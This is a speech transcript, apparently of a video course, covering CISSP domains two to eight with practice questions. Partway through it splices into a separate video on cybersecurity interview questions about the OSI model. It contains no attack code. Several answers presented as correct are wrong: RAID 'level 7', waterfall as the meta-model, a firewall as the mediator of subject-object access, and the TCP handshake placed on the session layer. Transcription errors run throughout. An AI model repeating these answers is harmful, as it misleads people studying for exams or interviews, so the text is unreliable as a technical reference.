will and all of these assets are now
owned by the hr department so there are
hundreds of people in hr so who exactly
owns this that's where we identify the
owner of that particular asset saying
you are responsible for the well-being
of these assets you belong to this
department so normally the head of that
department would be the owner of those
assets and would determine what kind of
access controls what kind of maintenance
management security mechanisms are
required then we talk about protection
privacy so data owners data processors
remnants collection limitations
determining uh ensuring appropriate
asset retention so let's say data right
uh even if i have data how long do i
retain data if you go into privacy acts
of organizations or of countries rather
so gdpr for european union gdpr
basically states that you will only
retain personal identifiable information
for as long as the organization requires
it the moment you have no reason to have
that data with you you're going to
delete that data so which means
automatically says you're going to
retain that data till it makes business
sense once you figure out it doesn't it
is not required you are going to delete
it in a secure manner which is not
recoverable to unwanted parties so you
have to determine those asset retention
periods we have to understand what those
attention retention periods are so even
for your physical assets there will be a
life of the set that is associated with
it and once the life of that asset is
over even ever if the asset is working
properly you have to discard that asset
and you have to replace it you have to
do this with security in mind then the
security controls for all of these
things understanding data states data
states could be in three different
aspects data in motion data at rest and
data in use how are you going to secure
data during all these three stages what
are the protection methods that you're
going to utilize then in establishing
information asset handling requirements
so that's what domain 2 is all about
let's look at the questions so the first
question in domain 2 which of the
following is responsible for setting
user clearances to computer-based
information is it operators data owners
security administrators or data
custodians understand the question who
is responsible for setting your user
clearances to computer-based information
and the correct answer to that is
security administrators they are
responsible for setting the user
clearances who are going to be
responsible for allowing the user
clearances that's going to be data
owners what is generally concerned with
personal security management controls
operational controls technical controls
or human resource controls now what is
personal security personal security is
people-centric security you're looking
at people and you're ensuring that their
security comes into the picture
technical controls can be used for
data assets or physical assets like
information technology but technical
controls may not be that relevant for a
human a firewall is not going to help
anyone any which ways management
controls are administrative controls
that means a policy that will help you
implement controls but for personal
security is the operational controls
that are going to be associated with it
which of the following factors
determines the frequency of information
security audits in any given environment
so the age-old question for you to
remain secure how often do you want to
conduct a security audit to verify your
vulnerabilities your penetration test to
verify your security controls are
working properly so would it be
dependent upon asset value the risk
based approach management discretion or
level of realized threats and here the
answer to that question is risk the
moment a risk is identified for example
at what various stages would a security
audit be triggered for an individual
asset as well and that can be tied down
to incident management change management
and problem management so if there is an
incident a security incident with a
database server where there has been an
attack on that server i probably want
the security audit done on that server
to identify vulnerabilities flaws and
then to mitigate those risks similarly
if there is a change that has been going
on into your organization you first want
to go into a risk assessment strategy
and then you want to look at security
audits based on the risk that you have
identified right so a security audit is
not only periodic based on compliances
or regulations but it also can be
integrated really well in your incident
management problem management and change
management scenarios that's domain
number two all right let's talk about
domain three security architecture and
engineering now this is where you tie up
security architecture and enterprise
architecture if you look at the first
domain we have talked about risk
assessments we have talked about
confidentiality integrity and
availability and then we have moved on
to the second domain where we talked
about asset security so that's where we
talked about data data classification
asset classification now it starts off
with the enterprise level architecture
so something like togaf what is
enterprise level architecture it's
basically data center architect and a
network architect trying to create data
flows deciding how communications are
going to happen between various devices
they're going to try to do network
segmentation for web application servers
database servers look at network
isolations network access control lists
and may even decide how firewalls and
where firewalls would be required once
that architecture is created we need to
secure that architecture to ensure that
whatever data communications are
happening within that framework they are
secured in a manner where all the risks
that the organization may be exposed to
are either managed mitigated accepted
transferred whichever the way it is
right so here you start off with
physical security you start up with
trusted platform modules so looking at
the outline this is where it starts off
with implement and manage engineering
processes using secure design principles
so this domain will talk about using
togaf and then using a zachman framework
to interact with all the data owners uh
all the asset owners
querying them about the security of the
assets the requirements because it is
not the security architect who
determines how secure the device will be
it is the asset owner who determines the
requirement of security for example
continuing with the hr example that we
were talking about earlier if the hr
department of head is responsible for
the database for the payroll application
it is that person who would be
determining the security levels so based
on the security architecture let's say
zachman framework we would create a
questionnaire that needs to be filled
out by the asset owner the hr department
of head and would be supplied to us the
security heads and then we would try to
create a security profile based on their
requirements so if the hr
department head comes back to me and
says that they require to be adhering to
a particular standard or they want x
kind of security it is us who will
validate that requirement and it is us
who will execute it and protect that
asset based on their requirements so
this is where your service security
architecture meets enterprise
architecture by using various frameworks
this domain will introduce you to not
only zachman framework it will again
take you to a trusted platform
module it will talk about idsec tc sec
common criteria and so on so forth so
this is again a very extensive module
some people struggle with it because it
is a largely a theoretical module and
some people would struggle with the
concept of how what is a security
architecture and an enterprise
architecture it is very important to
understand the differences between them
for example togaf is an enterprise
architecture where a data center
architect would deploy and streamline
those devices on which a layer of
security architecture such as iso 27001
would be implemented to enhance the
security and ensure that the
infrastructure remains protected at all
point in time this module will also deal
with managing vulnerabilities
on assets
applications web-based systems mobile
systems and embedded devices so this is
where your engineering comes into the
picture by this module we mean when we
are deploying infrastructure we need to
engineer it with security in mind we
need to architect in such a way that
security enhances the business needs
business requirements and they are
executed in a secure manner let's look
at a few questions based on domain 3
question 1 when a computer uses more
than one cpu in parallel to execute
instructions it is known as
multi-processing multitasking
multi-threading or parallel running now
here we need to understand what is the
difference between multitasking
multi-threading multi-processing and
parallel running now it would be very
difficult to explain all these processes
in in this video so uh here we are
talking about executing instructions
that's multi-processing multitasking is
performing multiple tasks at the same
time multi-threading is where processors
create their multiple threads to manage
certain functions here when we are
parallely executing instructions it is
known as multi-processing question two
who mediates all access relationships
between subjects and objects of a system
now what is a subject what is an object
and what are access relationships so
access relationships would be your
permissions that you have created now
what are permissions permissions would
be something that a person is authorized
to do so if you look at the cia which we
discussed in the module one
confidentiality integrity and
availability how do we keep data
confidential by only allowing authorized
users access to that data what are
authorized users authorized users are
people's people who have been identified
and are allowed access to certain
resources how do we do that by having an
identity and access management platform
in place which will be discussed later
in the next domain but confidentiality
would include i triple a standards i
triple a starts with identification
authentication authorization and
accountability identification is
identifying the person who they are
authentication is verifying that they
are actually who they claim to be
authorization is where the access
relationships come into the picture
where we once we have authenticated a
user we are creating a matrix which
allows them access to certain resources
to a certain extent some may have
read-only access some may have modify
access some may have delete access etc
so in this scenario we are talking about
access relationships between subjects
and objects of a system and who mediates
that now when you say reference kernel
information flow model or security
kernel of firewall in this particular
scenario for this particular question
based on the options that are available
we are talking about a rule access
control system which means that we have
created rules of what is allowed into a
network and how what is not allowed
within the network this can be
controlled by using a firewall so this
can be controlled by using a firewall
question three which of the following is
not a spam blocking architecture now
what is spam and how are you going to
block it it can be at the client side it
can be on the email server by way of
identified spam filters could be
application based in this scenario mail
blocking services basically you creating
a blacklist which will block emails from
certain addresses or from certain things
so this is not a spam blocking
architecture it's basically a blacklist
where you're blocking emails but spam
blocking architecture could either be at
the email server based could be at the
client side where they're using let's
say microsoft outlook express and their
created rules within it or could be on
an application where you have configured
rules over there moving on to domain
four now this is where the
technicalities come into the picture
communication and network security the
network security domain covers topics
focused on protecting the network of an
organization so communications tcp
channels udp channels the tcp so you
come across the osi layer you map the
osl layer with the tcp layer and see how
a data fragment packet is created
looking at domain four we are talking
about the osi layer open systems
interconnection uh compared to the tcp
ip or the transmission control protocol
over internet protocol models you're
talking about internet protocol itself
you're talking about converged protocol
software defined networks wireless
networks then we're talking about
securing network components so we talk
about firewalls types of firewalls and
coin security network access control
devices and we look at them over
virtualized networks wipe multimedia
looking talked about talking about
remote access data communications right
so all of this is concerned within
domain four now osi and tcp itself could
take hours for people to understand to
people to comprehend how computers work
now these are theoretical models and we
need to create an understanding of how
theory merges with the practical world
let's look at a few questions what is
the purpose of using a vpn now the sense
over here is what is a vpn or a virtual
private network how is it created what
technologies can be utilized within it
what encryption mechanisms can be
utilized and why are we creating that
encryption mechanism in the first place
so is it to secure remote access into a
network securely connect two networks
together secure data within the network
or all of the above so here with a vpn
we are basically trying to do everything
we are trying to create encrypted tunnel
between two systems or two networks
where data can be transmitted in a
secure manner where man-in-the-middle
attacks or network-based attacks would
be mitigated a vpn can secure packets
from data link layer onwards to the
application layer question two which of
the following characteristics are not
included in the tcp protocol now what is
a tcp protocol tcp is a connection
oriented protocol it is a reliable
protocol that is utilized to communicate
between uh servers in a reliable manner
so a tcp protocol being a connection
oriented protocol which is reliable in
nature so which of the following
characteristics are not included
connection less protocol that is the udp
protocols have this is not included in
the tcp protocol question three which
if you remember the previous slide would
be the udp protocol a udp protocol is a
protocol that is used for its speed
rather than reliability when it is
real-time processing that is required we
use udp so most of our voip
communications would happen over udp
protocols okay so looking at domain
number five domain five talks about
identity and access management so this
ties up with your asset management your
risk management because if we go back to
the confidentiality integrity and
availability aspect of it identity and
access management is basically allowing
authorized users access to resources by
authenticating them and also holding
them accountable so this becomes the
sense of how you're going to allow
people to access the resources that you
have in your organization let's look at
what this domain covers it will talk
about physical and logical access to
assets so servers need to be protected
by putting them in a secure server room
does this
restricting access to them and allowing
access only to those few people who
require access to them once we have
secured those servers uh this is where
we talk about physical security whereas
we got a secure room we're going to
monitor that room we will have access
controls we'll have guards monitoring
who is getting access or who's trying to
get access to that environment and then
you're going to create logical access as
well where we let's say have swipe cards
on the door locks so anyone with logical
swipe card can access that particular
facility you're also looking at managing
identification and authentication of
people devices and services so here we
are going to talk about authentication
mechanisms single authentication
multi-factor authentication we are
talking about single sign-ons we will
talk about federated identity management
modules we'll look at casbi or cloud
access service brokers we'll talk about
session management from applications and
so on so forth we will also talk about
third party identity as a service
provider where we integrate those
identities like open id into our
organization and we validate people
based on the identity that they have
created with those organizations then we
talk about access control list which
would be role-based access controls
mandatory access controls discretionary
access controls attribute-based access
controls rule-based access controls and
then there are a lot of theoretical
models that are integrated in this
module which talk about lattice-based
approach which will talk about other
theoretical models which will help you
align how identity and access management
is implemented in an organization so at
this point in time we will also be
looking at a life cycle of how
identities are managed for example
onboarding of people deboling of people
termination of employees employees as
they move within the organization by
getting promotions demotions or changing
departments and assuming a new role so
here we talk about how we can provision
an identity how we can de-provision an
identity how it is to be managed we are
going to create a
relationship between the creator of this
identity and the approver who is going
to be a manager so even if somebody is
allowed to create an identity they will
only create it if they have an approval
from appropriate manager so let's look
at questions from domain number five the
first one which of the following is the
most important factor while selecting a
biometric system for securing critical
assets now here the domain talks about
the types of authentication mechanisms
there are five types essentially three
basic types which talk about something
that you know which is a password
something that you have a swipe card
someone that you are a biometric
somewhere that you are location based
and something that you do like capture
so these are the five basic
authentication types or mechanisms that
you can utilize in an organization
multifactor authentication is having
multiple of these options in integrated
in our identity and access management
module to enhance the security now
coming back to biometrics biometrics
have positives and negatives amongst
them so uh with the biometric there are
two types that we talk about false race
of
false acceptance rate and false
rejection rate what is a false
acceptance rate uh somebody let's say
you are using a thumb print to
authenticate people somebody put down
their thumbprint the person is not
actually authorized however it was read
incorrectly and the door got unlocked
and the person got access to that
particular area which is a false
acceptance rate a false rejection rate
is an author authenticated or an
authorized person actually trying their
thumbprint but it not getting recognized
does they did not get access to the area
or to the device that they wanted now
the question here is which of the
following is the most important factor
while selecting a biometric system for
securing critical assets now would i
want to focus on false rejection rate or
false acceptance rate then we also have
equal error rate and maximum allowable
downtime maximum allowable downtime is
if the biometric measure fails and if
nobody's getting access to any of the
resources to what level or to what
extent would my business be able to
tolerate such an outage here the uh
correct answer is the false acceptance
rate because if an unauthorized person
gets access to my devices that's the
worst case scenario if the biometric
system is down and nobody's getting
access that may still be acceptable
rather than having an unauthorized
person getting access to very sensitive
data false rejection rate is also
detrimental to the organization however
it is not as bad as having a false
acceptance rate introduced in the
organization
the second question which are the two
major factors to measure biometric
performance again the question from the
previous one far false acceptance rate
and fr false rejection rate or fse and
err ier and far fr and gic
they don't actually relate so the
correct answer here is far false
acceptance rate and false rejection rate
so these are the two major factors false
rejection rate may still be a little bit
acceptable but a false acceptance rate
is not tolerable at all next question a
commercial application for steganography
that is used to identify documents or
verify that authenticity is either a
digital checksum an md5 hash a digital
signature or a watermark now here the
keywords matter you're talking about
steganography so suddenly people start
thinking about hiding data within data
and then if you just isolate the words
identified documents or verify their
authenticity we
basically directly go to a digital
signature because that's what we
utilized for non-repudiation however
what the question refers to is an
application for stiganography
seconography is hiding some element
which would be visible only to known
people we can utilize steganography on
for to benefit our ourselves or our
organization by using it to identify the
authenticity of a document so if i i'm
going to print out a document maybe a
watermark on the document which is not
visible to the naked eye but when i want
to validate the document i would search
for that particular watermark and that
is the correct answer for this
particular question so that's what
domain five is all about all right let's
look at domain number six which is
security assessment and testing now this
domain is all about
assessments auditing strategies
and testing so uh from this domain what
you're going to take away is talking
about internal audits external audits
third party audits
in the security control testing uh
strategizing about how we
implement a vulnerability management
system a program within the organization
that is repeatable consistent and
measurable can be tied up with other
management programs like patch
management incident management and
anything and everything
that requires a vulnerability assessment
like even change management if something
is going to change in an organization
you can have a vulnerability assessment
done before you want to even think about
allowing it or disallowing that change
similarly with penetration testing to
validate the vulnerabilities that you've
identified log reviews having a siem
tool that will help you analyze or
create a patent analysis of what's
happening within the infrastructure
what's happening within the organization
from a security perspective then you're
talking about collecting security
process data account management when we
say account management identity and
access management life cycle so
onboarding of an employee of voting of
an employee the lateral movements of an
employee in an organization when they're
getting promoted or they are transferred
in from one department to another right
so all of these would come under
security assessment and testing to see
how those policies are functioning to
analyze the
effectiveness of those policies does the
requirement for conducting vulnerability
assessment and penetration tests so
let's look at a few questions on this
domain and let's start off with the
first one which of the following ways
requires the involvement of an
information security analyst so out of
these four options assistance
requirements definition system design
program development or program testing
during which phase
would you involve a security analyst now
for this
we first need to identify why we require
a security analyst what is the job
requirement what is the
activity that is going to be conducted
by a security analyst right so in this
scenario the correct answer is program
testing in the dev program development
phase
we won't need an analyst we would need a
program manager and
architects who can develop a particular
program uh who can give it some
semblance of what needs to be achieved
in the system design it would be again
an architect who's going to develop that
system in the system's requirements
definition again so in the systems
requirements definition it's a
requirement gathering about what is
what you need to adhere to what is going
to be the baseline that you're going to
create so from these four options you
need to identify where would you place a
security analyst right in the exam it's
the most probable answer that you're
looking for it's not the most idealistic
answer right
so from these four options security
analyst would most likely be involved in
the program testing phase rather than
any other phase the second question
which of the following techniques is
generally not used for monitoring
purposes now when you say monitoring
what is monitoring monitoring is looking
into logs activities
anything and everything that has already
happened so you are reacting to
something that has already happened and
which of these following techniques is
not used for monitoring so you're
collecting logs you're analyzing those
logs what would be not be utilized a
penetration test intrusion detection
violation processing or counter measures
testing right now when you're monitoring
you would monitor the penetration test
to analyze if the test was successful or
not intrusion detection that's the first
input that you look at for analysis
violation processing anything is
violated any processes any policies you
analyze them and you uh you monitor them
does you come to know that this has
happened in counter-measures testing
there's basically a test of the
effectiveness of the countermeasures
that are already implemented at that
point in time you may not be monitoring
these the software program that acts on
behalf of user in their absence to carry
out operations is known as an agent worm
applet or a browser so a program that
acts on behalf of a user in their
absence to carry out operations is
either an agent an appellate or a verb
or a browser a browser is nothing but a
software that allows you to surf the
internet a worm is a malicious
application that would be more
of a nuisance value than anything else
an appellate is a something that allows
you interconnectivity an agent is
something that will that can be
automated used for automated tasks and
can run those tasks in the absence of a
particular user so if you look at these
questions understanding what each and
every word means understanding and
highlighting the keywords in the
question itself and then analyzing the
scenario that you are placed in and then
identifying the most appropriate answer
for that particular question that is how
you want to approach a cissp exam
looking at the next domain domain number
seven and that's security operations
let's look at what security operations
has for us now in security operations
you're looking at looking at a stock a
security operation center so your
regular volatility management incident
management uh problem management change
management placing controls
analyzing all that information so
probably having an siem tool configuring
this iem tool collecting all those data
so identifying event sources what are
event sources when i have an siem
implemented i am not going to expect the
siem to automatically
start collecting data all by itself and
then again i don't expect the siem tool
to understand what kind of data it needs
to collect so for me in a security
operation center
after i've installed an siem tool i
first need to configure it to identify
which devices i want to monitor from
which devices i want to collect that
information
and where do i want to store it once i
have all that information in place after
that i'm going to analyze that data to
identify if anything has been
incorrectly going on or is there any
security incident that has happened and
those would be raised as incidences and
that would be sent to the stock team for
analysis and then an incident response
right similarly intrusion detection and
prevention
logs would be utilized to identify
something that may have uh been missed
by the ids ips itself you're going to
place controls for investigations like
administrative uh controls which would
be policies that you have made then
you've got criminal laws or some uh if
something bad has happened that can be
described as a crime based on the law of
that land how you're going to deal with
it civil laws regular regulatory laws
and industry standards regulatory raws
would be for example gdpr in the
european union right a civil law would
be where there is no criminal activity
that has happened but let's say there's
a breach of contract between two
organizations and the civil lawsuit has
been filed against an organization for a
breach of service level agreements
regulatory would be the gdpr act where
you have to report to a regulatory body
and if there are any flaws you could be
fined industry standards iso 27001 pci
dss and so on so forth so when you're
looking at these requirements for
investigation all of these would have
prescribed how you're going to handle
that investigation if it is a criminal
investigation an organization by itself
doesn't have the right to investigate
they have to go to a law enforcement
agency and there is a procedure to
follow in case of a civil lawsuit there
are lawyers who would deal with this
this kind of activity send out notices
to the other party then go to a court of
law to file a lawsuit over there in gdpr
there are timelines on how you're going
to report a breach or how you're going
to report an incident and so on so forth
so in the security operations you're
creating a security operation center in
alignment with all of these five
requirements you're going to look at
logging and monitoring activities having
that siem tool which will identify those
devices that you want to monitor collect
relevant information that is prescribed
based on all those five investigation
types that we just discussed then you're
looking at
when you're looking at identification of
assets you go back to your asset
inventory asset register you look at all
the assets that you have and then you
make your strategy and plan how you want
to collect those logs right and then
this module will deal about how do you
want to handle identity and access
management privilege account management
service level agreements and so on so
forth so this basically is the
day-to-day day-to-day business activity
of an organization from a security
perspective so
you are there to identify incidents as a
cis you won't be executing this but you
would be creating policies revolving all
of these aspects so yeah this is what
you need to consider this is what you
need to strategize upon and this is what
you want to advise the organization to
what needs to be in place to be more
effective from a security perspective
let's look at the few questions from
this domain how does a subject get
access to an object in a multi-level
security policy now first we need to
understand what a multi-level security
policy is we need to understand what a
subject is and what an object is
let's look at the options first the
subject sensitivity label must dominate
the object sensitivity label the subject
sensitivity label subordinates the
object sensitivity sensitivity label the
subject sensitivity label is
subordinated by the object sensitivity
label and to repeat the sensitivity tags
again and again the subject sensitivity
label is dominated by the object
sensitivity label too much sensitivity
in a single slide however you can see
that this just confuses the version of
what they're trying to read and not only
you missing what keywords are so people
normally focus on a keyword called
multi-level security policy and start
getting confused in that
while we do disregard what a subject and
an object is right so a subject and an
object is a relationship that is created
between identity and access management
subject being the user object being the
resource that needs to be accessed by
that particular user after which comes a
multi-level security policy which is
basically the access control matrix that
you have created between these multiple
objects and multiple subjects so for
example
in this domain you would also talk about
theoretical models for access management
including lattice based approached
whether sensitivity labels come into the
picture you would talk about clark
wilson model you will talk about bella
padula model and a few other models
right all of them theoretical in nature
which can then based on other
implementations be implemented in a
real-time scenario so all that
understanding comes into the picture and
then you need to identify how the
sensitivity labels in a lattice-based
approach could allow you to create those
labels for your subjects and objects and
then the identity and access management
tool would become the verification
factor where it identifies the labels
for the subject and the object and they
based on those labels they allow or
disallow connectivity or allow
connections to happen now here the
correct answer is that the subject
sensitivity label must dominate the
object's sensitivity label so the user
should have a sensitivity label that
allows them access to the object which
has an equivalent sensitivity label so
understanding those models becomes very
much important not only from exam's
perspective but when you're creating a
policy you basically are going to use
these terminologies and you're going to
create a policy around this
moving on second question managers of
which department are ideal for the
development of information security
policy for an organization business
operation information technology
purchase or human resources now managers
of which department are ideal for
development of information security
policy for an organization and when we
say information security policy we would
obviously assume that is the i.t
department who's going to deal with it
and it's the information technology in
this r in this case but that's incorrect
it is the business operation why because
right from the first domain so we would
be taught in the training for cissp that
security needs to enhance the business
functionality not the other way around
so we are in the business or if we are
in the function of conducting a business
which would offer services and those
services that are being offered the
business activity that has been
conducted should be supplemented by
security so those business activities
could be conducted in a secure manner at
no point in time is going is security
going to be a deterrent to business the
only reason for anything to become a
deterrent to business is the legality of
it if a business is illegal it will not
happen or it should not happen however
if the business activity is legal then
security should not stop that activity
from happening security should be
implemented in such a way that it is the
business activity is strengthened uh
there is security embedded within it
secure by design and then the business
activity goes on so even if you're a
chief information security officer or a
security manager and you go and talk
with the
the board of directors or the steering
committee as the terms you will come
across in this training uh you will
understand that it is it's these people
who would define how the business is
going to work what kind of business
activity you're going to do and then you
provide the example and i'll give you an
example here let's say i'm an online
retailer and i want to sell good goods
online which is legal i'm selling all
legal goods goods
now i want security
team to come in and
they would help me to secure the the
function of being an online e-tailer if
you will my security team is not going
to come and tell me of not to do go into
that business or stop some services
because they may be insecure right the
security team's requirement is that if i
want to sell goods online they need to
now create an architecture of devices of
clouds or whatever is required to make
it secure so thus the managers of
business operations will always be the
ideal department for the development of
information security policies they
decide what is what the business is
going to happen and then the security
team just complements it by adding the
security to it for example just going on
with this a website is launched with
http the security team comes into the
picture and says data in motion needs
security so we're going to convert it
into https
and at no point in time are they going
to say http is vulnerable so we are not
going to do this we rather become a
wholesale shop or something like that
and i'm just giving an example and
rather than me just rambling on let's
move on to the next question question
three installing malicious software on
the system to allow future backdoor
access leads to violation of what
integrity does it violate the data
integrity system user or network now
malicious software on a system to allow
future backdoor access so what are we
doing here we are basically installing a
software or an application on a
particular system which allows a hacker
a backdoor access to the system so this
would violate the integrity of the
system itself right the data would be
compromised but the data would be
compromised because the system got
compromised a user doesn't matter
because a backdoor is a back door entry
where you can get access without even
logging in as a user and a network is
just a way of communication at this
point in time but the sense being that
system got infected and through that
infection you got access to whatever was
on that particular system now uh that's
domain number seven domain number eight
which is the last domain in the cissp
exam is software development security
sdlc or ssdlc secure software
development lifecycle right that's what
is discussed in this domain let's go
back to the cissp uh guide and see what
this domain would consist of so
software development security now you
can see software development life cycles
coming in so they're going to talk about
different life cycles like waterfall
model they're going to talk about agile
they're going to talk about modified
waterfall this module also will talk
about
devsecops devops and anything and
everything that would be there with the
software development lifecycle now when
we say software development lifecycle
the essence of assist is to add another
s to the s
s dlc the sdlc stands for software
development lifecycle the sys adds one
more as the secure software development
lifecycle
so
as with everything secure by design
which means security needs to be
integrated at every phase of the life
cycle and not should it should not be
bolted on for example a waterfall model
talks about how the software is going to
be developed and how it is going to be
published or released at the end of the
life cycle at no point in time does it
talk about security does security
archery at that point will die at that
point in time would come into the
picture and decide what are the
requirements of the software what uh
what are the security vulnerabilities or
the risk that they see so threat
modeling would happen and all those
things need to be introduced right from
the inception so if there are developers
or if there is a business requirement
for an application let's go back to the
previous example i'm an e-tailer so to
become an e-tailer not do i only need a
website i will need a web application
for that function it will be given out
so i need to develop that application in
a regular lifecycle model i develop that
application and then go into security
where i do a vapt on that application
find out that there are disastrous
results and then i go back and start
coding again which is not a good
scenario so i have hired a cis who will
then come into the picture during the
sdnc and the inception itself when
businessmen are talking about
how the business is going to happen at
that point in time the assist will come
in and start with a threat modeling
exercise saying you know what let's talk
about what are the risks this
application is going to face you're
going to handle a lot of payment
information because people need to pay
for the products right so credit cards
you're going to be uh going to be
involved there's a database so sql
injection attacks so these are the
threads that we're looking at and now a
threat modeling exercise would be
followed by a risk assessment then would
be looked at upon a by an impact
analysis and then based on that you will
prioritize those risks you will then
educate your developers to use secure
coding practices at the same time
security testing would be done to see
how the application is being evolved and
then by the time that the software
development lifecycle comes to an end
you would have a secure software which
had security by design integrated since
the inception rather than having bolted
on now this is the ideal scenario that
you're looking for the expense and the
budgeting that's where the balance of
life of
capital uh investments
and
time to market and all that comments
comes into the picture but for the
training we will always be in an ideal
scenario we'll always have enough time
enough resources monetary and human and
the exam basically looks at a very ideal
scenario in which you got just about
everything you just need to make the
correct decision at no point in time are
you going to think that if i start doing
a particular strategy it is going to
cost me a lot of money so i don't want
to do that that's the real whole
scenario in the real world you look at
the costs you look at the timelines
deadlines and then you take a informed
decision of how much you want to invest
in what in the ideal world for the cis
exam or the cissp exam there are no
limitations
you are looking at the most correct way
of doing those things and thus you are
you identify those requirements and
that's how you answer the exam so you're
looking at the security software
environments that you require
configuration management auditing and
logging of changes security impact of
acquired software now in this scenario
we talked about developing a software
what if i purchase a third-party
software and i introduced it into my
organization now this software when
integrated how is it going to impact my
current security controls
impact my current identity access
management my networking my other
applications my communications so that's
something that you want to assess as
well right so let's go for the questions
question one in which of the following
raid level the drive array continues to
operate even if any disks fails now
in the actual exam they're not going to
be very technical it's a managerial exam
so they may not ask you these kind of
questions but the knowledge is still
required so you need to know that there
is something called raid the different
levels of raid
because you might want to
use that as a solution in a particular
thing how do you want to implement rate
and all of those that's not the
knowledge that we want but in this
scenario rate level 7 is the ideal
answer question 2 which of the following
steps can be utilized uh or can be used
to protect an organization against the
failure of a critical software firm now
basically what does this talk about this
talks about disaster recovery or this
this talks about business continuity for
example there's a failure of some sort
when there is something that fails what
does it do it interrupts the business so
the moment of business interruption
happens what should kick in the business
continuity plan if the business
continuity plan fails that the disaster
recovery plan kicks in so if you look
into it as we go in we might even come
against uh terminologies like rto's rpos
return time objective and recovery point
objective and at that point in time you
want to look at how do we want to
recover from a data loss and does you
will come across solutions now
of the four options full backups
differential backups and incremental
backups and the fourth one software
escrow agreement what is the difference
between these the full backup is a
complete backup of the entire data that
you have taken now it sounds easy but in
an organization data could be terabytes
petabytes and to do a complete backup
might take days weeks or
a lot of time right it's not just
copying one megabyte from a hard disk to
a usb drive and be done with the backup
so full backups may be possible but not
on a regular basis so maybe you do a
full backup every week which means that
at the end of the week if the data loss
happens then you have lost the data for
an entire week because the backup was
last week thus it's not a very good
solution and to complement that we could
use incremental backups and differential
backups right so the training would
include all of these definitions of what
these backups are what happens and then
the fourth option software escrow
agreement what is that now in a software
development or a software lifecycle if
i've purchased a software from a third
party my biggest risk is not of me
getting hacked or the the software
getting hacked from a business
continuity the biggest risk is if the
software provider goes bankrupt or is
taken over by somebody else or stops
supporting the software then what what
am i to do because i may have invested
millions of dollars or reinvesting into
a different product and migrating to a
different product would be expensive
very costly and may be very time
consuming so what do i do at that point
in time so there is an option for
software escrow agreement what does that
mean that the source code of that
software is placed in an escrow which
means let's say
in a bank where the bank will hold the
soft uh the source code in a secure
manner and the source code cannot be
accessed or by be modified either by the
developing organization or the
purchasing organization so it just sits
with the bank if the developers go out
of business or they stop supporting at
that point in time the escrow can be
opened and the purchaser that that's us
in this case can still get the source
code so now we can develop the software
or we can go into the source code
analyze and save ourselves from a
disaster right so these are the four
options now here you're talking about a
critical software firm that failed
you're not talking about data that
failed so the correct answer here is the
software escrow agreement right question
number three now here we come across the
word development model which one of
these is a meta model that incorporates
several other software development
models are we looking at waterfall
modified waterfall spiral or critical
patch here the correct answer is a
waterfall model in this video we are
going to look at 10 different questions
on networking then we'll have 10 more
questions on software and programming
another 10 questions on operating
systems and applications
10 questions on cyber attacks and then
the finally 10 questions on cryptography
so we're going to discuss over 50 odd
questions each in these different fields
which will help you crack your
interviews as far as cyber security is
concerned let's start off with
networking questions let's start off
with question one what is the osi model
explain the different layers of the osi
model osi largely is a theoretical model
utilized to understand networking and
how data packets are created and how
they are being processed by a computer
this is normally used by the tcp the
transmission control protocol over
internet protocol
software suite
so osi is known as the open systems
interconnection model it is a reference
model that describes how applications
are going to interact via the computer
network
there are seven different layers that we
need to understand they are as follows
so in this diagram there are these seven
different layers we start off from the
bottom first is the physical layer the
data link layer network layer transport
layer session layer presentation and
application
when such a question is asked in an
interview
it is not only that we identified these
seven layers explaining what the osi
model is in the first place we then try
to identify these seven layers and we
give a brief description about each and
every layer if there are any additional
questions they will come after
this basic question
so let's start off with the physical
layer
this is the lowest layer of the osi
model now this is where any and every
physicality of your computer comes into
the picture so it could be a
network interface card it could be an
rj45 or a cat5 cable anything that
allows data to be transmitted physically
from your machine to another machine
next comes the data link layer so on the
data link layer as far as networking is
concerned we just need to understand
that data packet is encoded decoded into
bits at this layer this is also the
layer that deals with mac addressing so
the physical address of every network
interface card which is the mac address
which is utilized to
route
data packets over the network this is
where the mac address resides on the
data link layer
the next layer is the network layer
here datagrams are transferred from one
to another the function of this layer
are routing and logical addressing the
moment we talk about routing and logical
addressing ip addresses come into the
picture ipv version 4 ip version 6.
so network layer will deal with ip
addressing and the routing of those
packets
then comes the transport layer this is
the layer responsible for end-to-end
connections that automatically signifies
that this is where tcp and udp will be
working
tcp stands for transmission control
protocol udp for user datagram protocol
tcp
is a connection oriented protocol
whereas udp is a connectionless protocol
these two protocols are utilized to
establish connectivity between two
machines
tcp is a more reliable method of
connectivity because there are a lot of
packets that are sent across to verify
that the data has been sent data has
been received and so on so forth whereas
udp is a connection less protocol where
data is just dumped without verifying
whether the receiver
actually receives that data or not
so in a nutshell on the transport layer
tcp and udp make their appearance and
this is where that functionality lies
then comes the section there
this controls signals between the
computer it establish maintains and
terminates connections between processes
so in the transport layer we talked
about tcp and udp udp being a connection
less protocol where data is just
transmitted without verifying whether
the receiver received that data or not
whereas tcp we studied is more of a
reliable protocol thus
there are different packets signals that
will be sent across to verify that data
has been transmitted it has been
received properly and then the next
segment of that data is being sent so
those control signals are established
using the session layer so the three-way
handshake of tcp the acknowledgement
packets and
those kind of packets will be taken
taken care of on the session layer of
the osi model
then comes the presentation layer
the presentation layer is responsible to
translate data into the application
layer format so the formatting right
mime or encoding that is being utilized
the utf-8 character set that we utilize
for
presentation
encryption mechanisms all of these work
on the presentation layer
and finally comes the application layer
where
the application itself uses a particular
protocol
so that the
other
machine on the receiving end
the application on that machine would be
able to understand what the
communication was about
right so in a nutshell
if if i start from up top the
application layer will deal with any of
the data that the application
is generating so maybe an user input
you're logging in you're typing the
username password all that data will be
constructed let's say into an http or
https format that's where application
layer comes into the picture then the
formatting of which into utf-8
and the encryption of which would be
done at the presentation layer
then this transport layer and the
session layer would kick in to establish
a tcp session do the three-way handshake
establish that connectivity ip
addressing would be done on the network
layer mac addressing would be done on
the data link layer and when everything
is ready on the physical layer the
packet will be sent out at the receiving
end the packet will be received on the
physical layer and then all these layers
will be reversed and finally at the
application layer the data would be
presented to the application who would
then execute it and showcase it on the
screen
of the recipient
so this is the way you want to explain
this question you want to be very
concise precise about what you're
explaining you don't want to go into two
hypothetical scenarios you don't want to
delete earlier with the layers you just
want to give the basic functionality
want to demonstrate that you understand
what the osi layer is how the computer
functions and you want to move on from
there if the interviewer has any further
follow-up questions they will ask those
specific questions
so that's question one moving on to the
question two
question two is define unicasting
multicasting and broadcasting
now this is a question which can be very
lengthy but again most of your interview
questions
are designed that way it's basically to
understand how much conceptually you are
aware about these technologies so you
have to be very concise don't go
uh rattling about technology too much
but in a concise manner just try to
explain what these things is so when
data is being transmitted over a network
